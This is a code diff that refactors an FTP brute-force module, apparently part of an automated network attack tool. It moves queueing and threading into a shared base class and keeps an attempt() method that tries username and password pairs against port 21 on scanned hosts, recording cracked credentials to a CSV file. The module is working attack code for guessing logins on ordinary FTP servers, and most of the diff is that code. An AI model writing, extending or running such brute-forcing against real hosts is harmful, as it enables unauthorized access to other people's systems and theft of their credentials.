@@ -1,12 +1,12 @@
-import os
-import threading
+"""
+ftp_connector.py — FTP brute force (port 21).
+
+Thin adapter over BaseConnector (#12). Only attempt() and the module-level
+b_* discovery globals live here; queue/worker/run_bruteforce are shared.
+"""
 import logging
-import time
-from rich.console import Console
-from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
 from ftplib import FTP
-from queue import Queue
-from shared import SharedData, netkb_targets, append_csv_rows, dedupe_csv, credential_candidates, record_cracked_cred, settle_for_display
+from base_connector import BaseConnector, BaseBruteforce
 from logger import Logger
 
 logger = Logger(name="ftp_connector.py", level=logging.DEBUG)
@@ -17,62 +17,16 @@ b_status = "brute_force_ftp"
 b_port = 21
 b_parent = None
 
-class FTPBruteforce:
-    """
-    This class handles the FTP brute force attack process.
-    """
-    def __init__(self, shared_data):
-        self.shared_data = shared_data
-        self.ftp_connector = FTPConnector(shared_data)
-        logger.info("FTPConnector initialized.")
 
-    def bruteforce_ftp(self, ip, port, row=None):
-        """
-        Initiates the brute force attack on the given IP and port.
-        """
-        return self.ftp_connector.run_bruteforce(ip, port, row)
-    
-    def execute(self, ip, port, row, status_key):
-        """
-        Executes the brute force attack and updates the shared data status.
-        """
-        self.shared_data.bjornorch_status = "FTPBruteforce"
-        settle_for_display(self.shared_data)  # let the panel show this action's name
-        logger.info(f"Brute forcing FTP on {ip}:{port}...")
-        success, results = self.bruteforce_ftp(ip, port, row)
-        return 'success' if success else 'failed'
+class FTPConnector(BaseConnector):
+    PORT = 21
+    HEADER = "MAC Address,IP Address,Hostname,User,Password,Port\n"
+    OUTFILE_ATTR = "ftpfile"
+    PROGRESS_LABEL = "FTP"
+    QUEUE_HAS_MAC = True
 
-class FTPConnector:
-    """
-    This class manages the FTP connection attempts using different usernames and passwords.
-    """
-    def __init__(self, shared_data):
-        self.shared_data = shared_data
-        self.load_scan_file()
-
-        self.users = open(shared_data.usersfile, "r").read().splitlines()
-        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()
-
-        self.lock = threading.Lock()
-        self.ftpfile = shared_data.ftpfile
-        if not os.path.exists(self.ftpfile):
-            logger.info(f"File {self.ftpfile} does not exist. Creating...")
-            with open(self.ftpfile, "w") as f:
-                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
-        self.results = []  
-        self.queue = Queue()
-        self.console = Console()
-
-    def load_scan_file(self):
-        """
-        Load the netkb file and filter it for FTP ports.
-        """
-        self.scan = netkb_targets(self.shared_data.netkbfile, "21")
-
-    def ftp_connect(self, adresse_ip, user, password):
-        """
-        Attempts to connect to the FTP server using the provided username and password.
-        """
+    def attempt(self, adresse_ip, user, password):
+        """Login-only FTP connect with a hard connect timeout (#4). Any failure -> False."""
         try:
             conn = FTP()
             conn.connect(adresse_ip, 21, timeout=10)  # bounded: an unresponsive host must not stall the worker
@@ -80,121 +34,24 @@ class FTPConnector:
             conn.quit()
             logger.info(f"Access to FTP successful on {adresse_ip} with user '{user}'")
             return True
-        except Exception as e:
+        except Exception:
             return False
 
-    def worker(self, progress, task_id, success_flag):
-        """
-        Worker thread to process items in the queue.
-        """
-        while not self.queue.empty():
-            if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping worker thread.")
-                break
 
-            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
-            # try/finally so task_done() ALWAYS runs — otherwise a raise here kills the worker
-            # before it and queue.join() blocks forever, hanging the orchestrator.
-            try:
-                if self.ftp_connect(adresse_ip, user, password):
-                    with self.lock:
-                        self.results.append([mac_address, adresse_ip, hostname, user, password, port])
-                        record_cracked_cred(self.shared_data, user, password)
-                        logger.success(f"Found credentials for IP: {adresse_ip} | User: {user}")
-                        self.save_results()
-                        self.removeduplicates()
-                        success_flag[0] = True
-            except Exception as e:
-                logger.error(f"ftp_connect failed for {adresse_ip} as {user}: {e}")
-            finally:
-                self.queue.task_done()
-            progress.update(task_id, advance=1)
+class FTPBruteforce(BaseBruteforce):
+    connector_class = FTPConnector
+    display_name = "FTPBruteforce"
 
-    def run_bruteforce(self, adresse_ip, port, row=None):
-        # netkb already came in as `row` from the orchestrator, which read it this cycle.
-        # Re-parsing the whole file here to recover two fields we were handed cost a full
-        # csv.DictReader pass per host per action. `row=None` keeps the standalone __main__
-        # path (and any other caller) working by falling back to the old lookup.
-        if row is not None:
-            mac_address = row.get('MAC Address', '')
-            hostname = row.get('Hostnames', '')
-        else:
-            self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
-            match = next((r for r in self.scan if r.get('IPs') == adresse_ip), None)
-            if match is None:
-                logger.error(f"No netkb entry for {adresse_ip}; skipping.")
-                return False, []
-            mac_address = match['MAC Address']
-            hostname = match['Hostnames']
-
-        candidates = credential_candidates(self.shared_data, self.users, self.passwords)
-        total_tasks = len(candidates) + 1  # Include one for the anonymous attempt
-
-        for user, password in candidates:
-            if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
-                return False, []
-            self.queue.put((adresse_ip, user, password, mac_address, hostname, port))
-
-        success_flag = [False]
-        threads = []
-
-        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
-            task_id = progress.add_task("[cyan]Bruteforcing FTP...", total=total_tasks)
-
-            for _ in range(self.shared_data.bruteforce_threads):  # config-driven, core-aware (shared_data.bruteforce_threads)
-                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
-                t.start()
-                threads.append(t)
-
-            while not self.queue.empty():
-                if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
-                    while not self.queue.empty():
-                        self.queue.get()
-                        self.queue.task_done()
-                    break
-                # Yield. With no exit signal this body does nothing, so it span a core flat
-                # out for the whole attack, competing with the worker threads it waits on.
-                # queue.join() below already blocks correctly; this loop exists only to
-                # notice an exit signal and drain the queue.
-                time.sleep(0.2)
-
-            self.queue.join()
-
-            for t in threads:
-                t.join()
-
-        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful
-
-    def save_results(self):
-        """
-        Saves the results of successful FTP connections to a CSV file.
-        """
-        append_csv_rows(self.ftpfile, self.results)
-        self.results = []  # Reset temporary results after saving
-
-    def removeduplicates(self):
-        """
-        Removes duplicate entries from the results file.
-        """
-        dedupe_csv(self.ftpfile)
 
 if __name__ == "__main__":
+    from shared import SharedData
     shared_data = SharedData()
     try:
         ftp_bruteforce = FTPBruteforce(shared_data)
         logger.info("[bold green]Starting FTP attack...on port 21[/bold green]")
-        
-        # Load the IPs to scan from shared data
-        ips_to_scan = shared_data.read_data()
-        
-        # Execute brute force attack on each IP
-        for row in ips_to_scan:
+        for row in shared_data.read_data():
             ip = row["IPs"]
             ftp_bruteforce.execute(ip, b_port, row, b_status)
-        
-        logger.info(f"Total successful attempts: {len(ftp_bruteforce.ftp_connector.results)}")
-        exit(len(ftp_bruteforce.ftp_connector.results))
+        logger.info(f"Total successful attempts: {len(ftp_bruteforce.connector.results)}")
     except Exception as e:
         logger.error(f"Error: {e}")
